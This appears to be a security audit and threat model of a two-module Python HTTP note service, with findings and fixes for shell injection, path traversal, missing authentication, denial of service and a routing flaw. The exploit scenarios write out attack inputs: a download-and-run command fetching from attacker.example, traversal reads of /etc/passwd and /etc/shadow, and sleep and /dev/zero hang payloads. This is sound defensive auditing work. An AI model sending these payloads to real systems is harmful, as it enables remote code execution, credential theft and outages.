## Threat Model

### System context

The target is a small, dependency-free Python HTTP note service (stdlib http.server, two modules: app/server.py and app/notes.py) bound to 0.0.0.0:8080. It exposes two GET routes with no authentication layer, no framework, and no reverse proxy visible in the repo: /export?name=... (shells out to a 'note2pdf' converter) and a default /?path=... route that reads files from a hard-coded NOTES_DIR. The server runs single-threaded with no configured timeouts.

### Assets

| Asset | Sensitivity | Description |
| --- | --- | --- |
| Server host / process | critical | The OS process running the HTTP server, reachable for arbitrary command execution via the /export sink. |
| Local filesystem (beyond NOTES_DIR) | high | Any file readable by the server user (credentials, SSH keys, env files, source), exposed via the unconstrained path-join in read_note(). |
| NOTES_DIR contents | medium | The intended note storage at /var/notes, readable/writable indirectly via the same unauthenticated routes. |
| Service availability | medium | The single request-handling thread, which any of several findings can wedge indefinitely. |

### Trust boundaries

- **Anonymous network client -> HTTP handler** — Handler.do_GET performs zero authentication or session checks before dispatching to either sink, so any network-reachable anonymous client crosses directly into command execution and filesystem-read code.
- **HTTP query string -> shell interpreter** — The `name` query parameter crosses from untrusted network input directly into a shell command string executed via subprocess.run(shell=True), with no escaping boundary in between.
- **HTTP query string -> filesystem namespace** — The `path` query parameter crosses from untrusted network input directly into os.path.join/open() with no containment boundary relative to NOTES_DIR.
- **HTTP handler -> importable library API** — export_note()/read_note() are reachable both through the HTTP edge and as directly importable functions, so any future edge-level control (auth, rate limiting) would not extend to in-process callers.

### Ranked threats

| # | Threat | Rationale |
| ---: | --- | --- |
| 1 | Unauthenticated remote code execution via shell injection, compounded by a routing defect that widens the reachable path space and a total absence of sink-level authorization | f_taint_01_1 gives full RCE with a single unauthenticated request; f_gf004_1 shows the vulnerable route is reachable by more than the documented path, defeating path-keyed defenses; f_gf_006_1 shows no fix at the routing or HTTP-auth layer alone would contain it. Combined in exploit chain #1, this is the single most severe exposure in the system. |
| 2 | Unauthenticated arbitrary file read via path traversal | f_notespathtr_1 lets any anonymous client read arbitrary files the server process can access (credentials, keys, source), independently exploitable and demonstrated against /etc/passwd. |
| 3 | Full-service denial of service from the single-threaded, timeout-free server amplifying otherwise-bounded slow operations | f_gf_003_1's architecture turns f_gf001_1 (untimed shell-out) and f_gf001_2 (unbounded read of /dev/zero via traversal) into total outages from a single request each, per exploit chain #2. |
| 4 | Systemic absence of authentication/authorization as the root enabler of all of the above | f_gf_006_1 is not an independent bug so much as the structural reason every other finding is reachable by anonymous, unauthenticated actors; fixing it is necessary but not sufficient without also fixing the individual sinks. |

### Open questions

- Is NOTES_DIR (/var/notes) actually populated at deploy time, and does it or the host filesystem contain secrets beyond ordinary notes?
- Is this service intended to be internal-only or directly internet-facing? No reverse proxy, WAF, or network policy is visible in the repository to evaluate real-world exposure.
- Is the external 'note2pdf' binary itself trustworthy, and could its own argument parsing be abused further (see the related argument-injection variant f_gf002_1) even after shell=True is removed?

### 1. [CRITICAL] Unauthenticated OS command injection in GET /export via `name` parameter

**Class:** command_injection  
**CWE:** CWE-78: Improper Neutralization of Special Elements used in an OS Command (Command Injection) — https://cwe.mitre.org/data/definitions/78.html  
**File:** `app/notes.py:7-11`  
**CVSS 3.1:** **9.8** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Confidence:** 0.99  
**Also at:** `app/notes.py:7`, `app/notes.py:7`  

#### Description

Unauthenticated HTTP GET /export?name=<value> (app/server.py:9-12, Handler.do_GET) reads the `name` query parameter with no validation and passes it directly to export_note(name), which builds a shell command via string concatenation ('note2pdf --title ' + name) and runs it with subprocess.run(cmd, shell=True). Any shell metacharacter in `name` (;, |, $(...), backticks, &&) lets the attacker run arbitrary commands as the server process. Confirmed end-to-end with a working PoC that observed the injected shell command execute and its marker output reflected in the HTTP response.

#### Impact

Full remote code execution as the server process — attacker can read/write arbitrary files, exfiltrate secrets, install persistence, or pivot to the internal network, all with a single unauthenticated HTTP request.

#### Exploit scenario

An anonymous attacker on the network sends GET /export?name=x%3Bcurl+attacker.example%2Fx.sh%7Csh%3Bx to the server on 0.0.0.0:8080. Handler.do_GET passes the raw `name` value to export_note(), which concatenates it into 'note2pdf --title x;curl attacker.example/x.sh|sh;x' and runs it via subprocess.run(shell=True), downloading and executing attacker code as the server's user.

#### Preconditions

_Not determined (static run)._

_Evidence:_

```
# app/server.py
8  class Handler(BaseHTTPRequestHandler):
9      def do_GET(self):
10         q = parse_qs(urlparse(self.path).query)
11         if self.path.startswith("/export"):
12             body = export_note(q.get("name", ["untitled"])[0])

# app/notes.py
7  def export_note(name):
8      """Export a note to PDF via the system converter."""
9      cmd = "note2pdf --title " + name
10     out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
11     return out.stdout
```

**Entry points:**
- `http_route` at `app/server.py:11` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:10` — `Handler.do_GET()`
1. `app/server.py:11` — `Handler.do_GET()`
1. `app/server.py:12` — `Handler.do_GET()`
1. `app/notes.py:9` — `export_note()`
1. `app/notes.py:10` — `export_note()`

#### How to fix

In app/notes.py export_note(), drop the string-concatenation + shell=True pattern entirely: build cmd as a list (['note2pdf', '--title', name]) and call subprocess.run(cmd, shell=False, capture_output=True, text=True, timeout=<N>). Add server-side input validation on `name` (length cap, character whitelist) before it reaches export_note, and fix the route dispatch in server.py (see f_gf004_1) so only the exact /export path reaches this function.

#### Adversarial verification

**Verdict:** TRUE_POSITIVE — confidence 0.99

Read both files directly. server.py:12 passes the raw `name` query param (unauthenticated GET /export, no session/token check in do_GET) into export_note, which at notes.py:9 does plain string concatenation 'note2pdf --title ' + name and executes it via subprocess.run(cmd, shell=True) at notes.py:10. I searched for defenses across the repo: there is no validator, whitelist, shlex.quote, or arg-list form anywhere on the path; shell=True with a concatenated string means any of ; | $() `` && breaks out. Grep for export_note shows exactly one call site (server.py:12), which is the exploitable one, so the downgrade-discipline gate is satisfied. No framework auto-escaping exists (raw BaseHTTPRequestHandler). The benign readings I tried all fail: subprocess is not given an args list, name is not schema-validated, and the route requires no auth.

### 2. [CRITICAL] Unauthenticated path traversal / arbitrary file read in GET / via `path` parameter

**Class:** path_traversal  
**CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) — https://cwe.mitre.org/data/definitions/22.html  
**File:** `app/notes.py:14-17`  
**CVSS 3.1:** **7.5** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**Confidence:** 0.97  
**Also at:** `app/notes.py:14`  

#### Description

read_note() builds the file path with os.path.join(NOTES_DIR, path) where `path` is the raw, unauthenticated HTTP query parameter from app/server.py:14 (GET /?path=...). There is no normalization, no realpath/containment check, and no rejection of absolute paths or '..' segments before open(). Because os.path.join discards its first argument when the second is absolute, GET /?path=/etc/passwd resolves to '/etc/passwd', bypassing NOTES_DIR completely; relative traversal is equally exploitable. Confirmed with a working PoC that read the real /etc/passwd through the live HTTP server.

#### Impact

Attacker can read any file on disk that the server process can read — SSH keys, environment/config files with credentials, source code — without authentication.

#### Exploit scenario

An anonymous attacker sends GET /?path=/etc/passwd (or GET /?path=../../../../etc/shadow for relative traversal). Handler.do_GET passes `path` unmodified to read_note(), which calls open(os.path.join(NOTES_DIR, path)); because path is absolute, os.path.join discards NOTES_DIR entirely and open() returns the contents of the target file, written back into the HTTP response body.

#### Preconditions

_Not determined (static run)._

_Evidence:_

```
# app/server.py
 9   def do_GET(self):
10       q = parse_qs(urlparse(self.path).query)
11       if self.path.startswith("/export"):
12           body = export_note(q.get("name", ["untitled"])[0])
13       else:
14           body = read_note(q.get("path", ["welcome.txt"])[0])

# app/notes.py
 1   import os
 4   NOTES_DIR = "/var/notes"
14   def read_note(path):
15       """Read a note from the notes directory."""
16       with open(os.path.join(NOTES_DIR, path)) as fh:
17           return fh.read()
```

**Entry points:**
- `http_route` at `app/server.py:14` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:10` — `Handler.do_GET()`
1. `app/server.py:14` — `Handler.do_GET()`
1. `app/notes.py:16` — `read_note()`

#### How to fix

Replace the unchecked os.path.join with a safe-join helper: candidate = os.path.realpath(os.path.join(NOTES_DIR, path)); if not candidate.startswith(os.path.realpath(NOTES_DIR) + os.sep): raise/return 403. Also reject `path` values containing '..' segments or a leading '/' before the join, as defense in depth.

#### Adversarial verification

**Verdict:** TRUE_POSITIVE — confidence 0.97

Read both files directly. app/server.py:14 pulls the `path` query param with no authentication (the do_GET handler has zero auth/session checks) and passes it verbatim to read_note(). notes.py:16 does open(os.path.join(NOTES_DIR, path)) with no normalization, no os.path.realpath containment check, no rejection of '..' or absolute paths. os.path.join('/var/notes', '/etc/passwd') returns '/etc/passwd' because Python discards the base when the second arg is absolute; relative '../' traversal walks out of /var/notes identically. Grep confirms read_note has exactly one call site and open() exactly one, so downgrade discipline is satisfied — every path to the sink is the unsafe one. No sanitizer, decorator, or middleware exists anywhere in the two-file app. The benign readings (framework auto-containment, an upstream validator, absolute-path rejection) are all falsified by the actual code.

### 3. [HIGH] Missing authentication/authorization on note export and read operations (HTTP and library API)

**Class:** auth_bypass  
**CWE:** CWE-306 — https://cwe.mitre.org/data/definitions/306.html  
**File:** `app/notes.py:7-17`  
**CVSS 3.1:** **9.8** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Confidence:** 0.95  

#### Description

export_note() and read_note() back both HTTP routes (app/server.py do_GET) and are directly importable by any Python code in the process. Neither the functions nor their caller contain any concept of identity, session, token, or role — a repo-wide search for auth-related terms returns zero matches. The absence of access control is total and uniform across both the HTTP edge and the library API, meaning even a future edge-level auth check would be bypassed by any direct importer.

#### Impact

Any anonymous network client or any in-process code that imports app.notes can execute shell commands and read arbitrary files with zero identity check — there is no layer at which access control could be enforced even if the routing/HTTP layer were later locked down.

#### Exploit scenario

A future maintainer adds an API-key check to Handler.do_GET believing it secures the app. A plugin, worker, admin CLI, or REPL that does `from app.notes import export_note, read_note` and calls them directly bypasses that check entirely, because export_note()/read_note() have no identity parameter or internal authorization gate — exactly as an anonymous HTTP client can today.

#### Preconditions

_Not determined (static run)._

_Evidence:_

```
def export_note(name):
    cmd = "note2pdf --title " + name
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return out.stdout

def read_note(path):
    with open(os.path.join(NOTES_DIR, path)) as fh:
        return fh.read()
```

**Entry points:**
- `http_route` at `app/server.py:11` — controllable by anonymous_user
- `http_route` at `app/server.py:14` — controllable by anonymous_user
- `library_api` at `app/notes.py:7` — controllable by anonymous_user
- `library_api` at `app/notes.py:14` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:9` — `Handler.do_GET()`
1. `app/server.py:10` — `Handler.do_GET()`
1. `app/server.py:14` — `Handler.do_GET()`
1. `app/notes.py:16` — `read_note()`

#### How to fix

Introduce a minimal auth mechanism (e.g. a shared-secret header checked in do_GET, or a session/token system) and thread a verified identity/capability object into export_note(name, caller) / read_note(path, caller), raising PermissionError if caller lacks the required role. Fix this together with f_gf004_1's routing bug and f_taint_01_1's injection — none of the three alone closes the RCE exposure.

#### Adversarial verification

**Verdict:** TRUE_POSITIVE — confidence 0.95

Read app/notes.py, app/server.py and the empty app/__init__.py — the entire application. Both sink functions are invoked from Handler.do_GET (server.py:12,14) using raw query-string values with no Authorization/session/token/API-key check, and HTTPServer binds 0.0.0.0:8080, making them anonymously reachable over the network. A whole-repo grep for auth|login|session|token|password|admin|permission|role|Authorization|api_key returns zero matches, confirming no central middleware, decorator, or shared guard exists anywhere (full-codebase defense search). Downgrade discipline satisfied: the only two call sites of export_note/read_note are both in server.py and both unauthenticated; the functions are also directly importable, a second unguarded entry path. Input is fully attacker-controlled (query params), so this is not a no-input/reliability issue. The missing authentication exposes genuinely dangerous sinks — subprocess with shell=True concatenating attacker input, and open(os.path.join(NOTES_DIR, path)) with an attacker-supplied path — to any anonymous client.

### 4. [HIGH] Unbounded shell-out without timeout enables single-request denial of service via GET /export

**Class:** denial_of_service  
**CWE:** CWE-400: Uncontrolled Resource Consumption — https://cwe.mitre.org/data/definitions/400.html  
**File:** `app/notes.py:9-11`  
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**Confidence:** 0.95  

#### Description

export_note() runs subprocess.run(cmd, shell=True, ...) with no timeout= argument, reached from the unauthenticated GET /export route on a single-threaded http.server.HTTPServer. An attacker who injects a non-terminating shell command (e.g. name=;sleep 999999) blocks the sole request-handling thread indefinitely, denying service to every other client until an operator restarts the process.

#### Impact

A single unauthenticated request can hang the server's only worker thread indefinitely, denying service to all other clients until an operator kills and restarts the process.

#### Exploit scenario

An attacker sends GET /export?name=%3Bsleep+999999 (or a fork bomb). export_note() runs 'note2pdf --title ;sleep 999999' via subprocess.run(shell=True) with no timeout, blocking the single-threaded server's only request-handling thread indefinitely and denying service to every other client.

#### Preconditions

_Not determined (static run)._

_Evidence:_

```
def export_note(name):
    cmd = "note2pdf --title " + name
    out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return out.stdout

def main():
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

**Entry points:**
- `http_route` at `app/server.py:11` — controllable by anonymous_user

**Call chain:**

1. `app/notes.py:9` — `export_note()`
1. `app/notes.py:10` — `export_note()`

#### How to fix

Change subprocess.run(cmd, shell=True, capture_output=True, text=True) to subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10), wrap the call in try/except subprocess.TimeoutExpired to return a 504/error body, and fix the underlying shell-injection (f_taint_01_1) so attacker-controlled shell metacharacters can't reach subprocess.run at all.

Because shell=True splits on `;`, a payload like `name=;sleep 999999` (or a fork bomb) runs a never-terminating command that blocks subprocess.run() indefinitely, wedging the sole request-handling thread and denying service to all other clients until an operator restart. I searched for every benign escape hatch — a wrapping socket timeout, a threading server, a default subprocess timeout, upstream sanitization of `name` — and none exists in the code.

### 5. [HIGH] Unbounded file read combined with path traversal enables denial of service via /dev/zero read

**Class:** denial_of_service  
**CWE:** CWE-400: Uncontrolled Resource Consumption — https://cwe.mitre.org/data/definitions/400.html  
**File:** `app/notes.py:16-17`  
**CVSS 3.1:** **7.5** (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**Confidence:** 0.90  

#### Description

read_note() opens os.path.join(NOTES_DIR, path) and calls fh.read() with no size limit. Because `path` is not constrained to NOTES_DIR (the same traversal as f_notespathtr_1), an attacker can target /dev/zero, an endless byte stream; fh.read() then never reaches EOF and never returns, permanently blocking the single-threaded server's only worker thread.

#### Impact

A single unauthenticated request can hang the server's only worker thread indefinitely (reading a never-ending special file), denying service to all other clients until an operator restarts the process.

#### Exploit scenario

An attacker sends GET /?path=../../../../../../dev/zero. Because read_note() has no path-traversal containment, os.path.join(NOTES_DIR, path) resolves outside NOTES_DIR to the /dev/zero character device; fh.read() with no size limit then blocks forever trying to reach an EOF that never comes, freezing the server's single request thread.

#### Preconditions

- /dev/zero (or another endless/large readable special file) is reachable from the server process's filesystem — true on standard Linux hosts

_Evidence:_

```
def read_note(path):
    """Read a note from the notes directory."""
    with open(os.path.join(NOTES_DIR, path)) as fh:
        return fh.read()
```

**Entry points:**
- `http_route` at `app/server.py:14` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:10` — `Handler.do_GET()`
1. `app/server.py:14` — `Handler.do_GET()`
1. `app/notes.py:16` — `read_note()`
1. `app/notes.py:17` — `read_note()`

#### How to fix

In app/notes.py read_note(), after resolving and validating the path stays within NOTES_DIR, replace 'return fh.read()' with a bounded read such as 'return fh.read(MAX_NOTE_SIZE)' (e.g. 1 MiB), and combine with switching the server to ThreadingHTTPServer with a request timeout (f_gf_003_1) as defense in depth.

Confirmed by reading both files. read_note() (notes.py:14-17) opens os.path.join(NOTES_DIR, path) with attacker-controlled, unconstrained `path` (traversal is unblocked, so ../../../../dev/zero resolves to the /dev/zero character device) and calls fh.read() with no size argument, reading to an EOF that never arrives. server.py:21 uses stdlib HTTPServer (not ThreadingHTTPServer) via serve_forever() with no socket/request timeout, so the single handler thread stuck in that read() blocks every other client. The path param at server.py:14 is unauthenticated and passed verbatim; there is no upstream validator, no design_controls, and read_note has exactly one call site (server.py:14), which is exploitable. The strongest benign reads — path containment, a size/timeout cap, or multi-threading absorbing the block — are all falsified by the actual code.

### 6. [MEDIUM] Unauthenticated denial of service via missing socket timeout on single-threaded HTTPServer

**Class:** denial_of_service  
**CWE:** CWE-400: Uncontrolled Resource Consumption — https://cwe.mitre.org/data/definitions/400.html  
**File:** `app/server.py:20-21`  
**CVSS 3.1:** **7.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**Confidence:** 0.93  

#### Description

main() constructs a plain http.server.HTTPServer (no ThreadingMixIn/ForkingMixIn) and calls serve_forever() with no timeout configured anywhere — no Handler.timeout, no server.timeout, no socket.settimeout(). A client that connects and never completes the request line blocks BaseHTTPRequestHandler's rfile.readline() indefinitely; since the server has exactly one worker, one such connection freezes the service for every other client (Slowloris-style), unauthenticated and with trivial resource cost.

#### Impact

A single attacker-held TCP connection freezes the entire service for every other client (legitimate users get no response) until an operator manually restarts the process.

#### Exploit scenario

An attacker opens a raw TCP connection to port 8080 and sends a partial HTTP request line that never terminates with CRLF. The single-threaded HTTPServer's request loop blocks in BaseHTTPRequestHandler.handle_one_request() on self.rfile.readline(), which never returns; because there is only one worker, no other client's request is serviced until the attacker closes the connection.

#### Preconditions

- Server reachable by the attacker on TCP 8080 with no fronting reverse proxy/load balancer that itself enforces a connection or read timeout

_Evidence:_

```
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ...

def main():
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

**Entry points:**
- `http_route` at `app/server.py:21` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:21` — `main()`
1. `app/server.py:8` — `Handler()`
1. `app/server.py:9` — `Handler.do_GET()`

#### How to fix

In app/server.py, define 'class ThreadingServer(socketserver.ThreadingMixIn, HTTPServer): daemon_threads = True' and use it in main() instead of plain HTTPServer; also set Handler.timeout = 10 (StreamRequestHandler honors this for the initial read) to bound how long any single connection can hold a worker.

#### Adversarial verification

**Verdict:** TRUE_POSITIVE — confidence 0.93

app/server.py:21 constructs a plain HTTPServer (not ThreadingHTTPServer) and calls serve_forever(), giving a strictly serial request loop with exactly one worker. The Handler class (lines 8-17) defines only do_GET and no `timeout` class attribute; main() sets no server.timeout and no socket.settimeout(). A repo-wide grep for timeout/threading/settimeout returns only the import and the server construction line — no mitigation exists anywhere. socketserver's `timeout` defaults to None, so BaseHTTPRequestHandler.handle_one_request blocks indefinitely on self.rfile.readline(65537) for a client that connects and never completes the request line. Because the single worker is occupied, that one idle/partial connection starves every other client (classic Slowloris), unauthenticated, at the cost of one TCP socket. The hang occurs in the accept/read loop before do_GET runs, so it is independent of notes.py handler logic.

### 7. [MEDIUM] Prefix-match route dispatch (startswith("/export")) widens and desynchronizes access to the command-injection sink

**Class:** logic_error  
**CWE:** CWE-697 — https://cwe.mitre.org/data/definitions/697.html  
**File:** `app/server.py:9-14`  
**CVSS 3.1:** **9.8** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**Confidence:** 0.72  

#### Description

The route dispatcher uses self.path.startswith("/export") — a raw-string prefix test against the full request-target — instead of an exact match on the parsed path. This routes /exportBOGUS_TYPO, /exports, and /export/../evil to export_note() (the shell-injection sink) alongside the intended /export, while the case-variant /EXPORT falls through to read_note() instead. This defeats any external control (WAF/proxy allow-list, log-based alerting) that assumes the dangerous endpoint is reachable only at the literal /export path.

#### Impact

Any URL sharing the 7-character prefix /export (typos, encoded variants, /export/../evil) reaches the shell-injection sink, defeating path-based defenses (WAF/proxy allow-lists, monitoring) that assume the sink is reachable only at the literal /export path; conversely the case-variant /EXPORT silently falls through to the file-read branch, showing the dispatch logic is not self-consistent.

#### Exploit scenario

A defender has configured a reverse proxy or WAF to only forward/alert on exact requests to /export. An attacker instead requests GET /exportBOGUS_TYPO?name=;id or GET /export/../evil?name=;id — server.py's startswith("/export") check still routes these to export_note(), reaching the same shell-injection sink as f_taint_01_1 while evading the path-keyed control.

#### Preconditions

- A deployment where an external control (WAF, reverse-proxy allow-list, log-based alerting) keys on the exact literal path /export; the code-level dispatch defect itself is unconditional

_Evidence:_

```
def do_GET(self):
    q = parse_qs(urlparse(self.path).query)
    if self.path.startswith("/export"):
        body = export_note(q.get("name", ["untitled"])[0])
    else:
        body = read_note(q.get("path", ["welcome.txt"])[0])
```

**Entry points:**
- `http_route` at `app/server.py:11` — controllable by anonymous_user

**Call chain:**
1. `app/server.py:10` — `Handler.do_GET()`
1. `app/server.py:11` — `Handler.do_GET()`
1. `app/server.py:12` — `Handler.do_GET()`
1. `app/notes.py:9` — `export_note()`
1. `app/notes.py:10` — `export_note()`

#### How to fix

In app/server.py do_GET, parse the path once (p = urlparse(self.path).path) and dispatch on p == "/export" rather than raw-string startswith on self.path (which includes the query string and any trailing garbage). Add a default 404 branch for paths that match neither route instead of silently falling into read_note().

**Verdict:** TRUE_POSITIVE — confidence 0.72

Read server.py:11 directly: routing uses `self.path.startswith("/export")`, a prefix comparison against the raw request-target, not an exact match on the parsed path — a textbook CWE-697 incorrect comparison. `export_note` (notes.py:9-10) concatenates `name` into `"note2pdf --title " + name` and runs it under `subprocess.run(..., shell=True)`; `name` comes straight from `parse_qs` with no sanitization. Grep confirms `export_note` has exactly one call site (server.py:12), and the whole app (three files) has no auth, no middleware, and no upstream validator that could constrain either the path or `name`. The prefix match therefore genuinely dispatches `/exports`, `/exportBOGUS_TYPO`, `/export/../evil` to the shell sink while the case-variant `/EXPORT` falls through to `read_note` — a demonstrably over-broad and self-inconsistent dispatch. The strongest benign counter (broad matching is intended and the injection is reachable at `/export` regardless, so no new capability) does not clear the finding: the comparison is objectively incorrect, the `/EXPORT` inconsistency shows it is not a coherent design, and widening the path-space that reaches an unauthenticated RCE sink is exactly the path-confusion pattern that defeats path-keyed proxy/WAF/monitoring controls.

## Exploit chains

### [CRITICAL] Prefix-match routing bypass + absent sink-level auth eliminate any reliable boundary around the shell-injection RCE
**Findings:** f_gf004_1, f_taint_01_1, f_gf_006_1

server.py:11 dispatches on self.path.startswith("/export") rather than an exact-match on the parsed path. Any request sharing the 7-character prefix — /exportBOGUS_TYPO, /exports, /export/../evil — is routed to export_note() (server.py:12), which concatenates the unsanitized `name` parameter into a shell command and executes it with subprocess.run(cmd, shell=True) (notes.py:9-10, f_taint_01_1). This means an external control that assumes the dangerous shell-out sink is reachable only via the literal string '/export' — a WAF rule, reverse-proxy allow-list, or log-based alert — is defeated by any prefix variant, materially widening the practical attack surface for command injection/RCE beyond what the documented route implies. f_gf_006_1 confirms this isn't just a routing slip that a routing fix alone would remedy: export_note() and read_note() have zero concept of caller identity anywhere in the two-module codebase, and are directly importable outside the HTTP handler. So even if a defender closed f_gf004_1 by switching to an exact-match router, or bolted an authorization check onto Handler.do_GET, the sink functions themselves still execute unconditionally for any caller that reaches them — meaning there is no layer (HTTP routing or function-level) where a single patch reliably protects the RCE primitive; both f_gf004_1 and f_gf_006_1 would need to be fixed together to actually contain f_taint_01_1.

### [HIGH] Single-threaded, timeout-free HTTP server turns command-injection and path-traversal reads into full-service DoS
**Findings:** f_gf_003_1, f_gf001_1, f_gf001_2, f_taint_01_1, f_notespathtr_1

server.py:20-21 builds a plain single-threaded http.server.HTTPServer with no ThreadingMixIn and no timeout configured anywhere — f_gf_003_1 establishes that this architecture has exactly one worker handling requests fully serially. This is the amplifying substrate for two otherwise-bounded 'slow operation' bugs: (1) f_taint_01_1's unauthenticated shell-injection into export_note() (notes.py:9-10) is executed via subprocess.run(cmd, shell=True) with no timeout= argument (f_gf001_1); a payload like name=;sleep 999999 makes that call block indefinitely. (2) f_notespathtr_1's unauthenticated path traversal in read_note() (notes.py:16) lets an attacker target a special file such as /dev/zero; fh.read() with no size bound then blocks forever trying to reach EOF that never arrives (f_gf001_2). Neither slow-operation bug by itself would need to affect other clients on a threaded/forking server — but because f_gf_003_1's server has only one request-handling thread and no socket-level timeout, either single unauthenticated GET request permanently wedges that one thread, freezing the entire service for every other client until an operator restarts it. The traversal/injection findings supply the trigger; the single-threaded no-timeout server converts each into a total outage rather than a contained per-request hang.
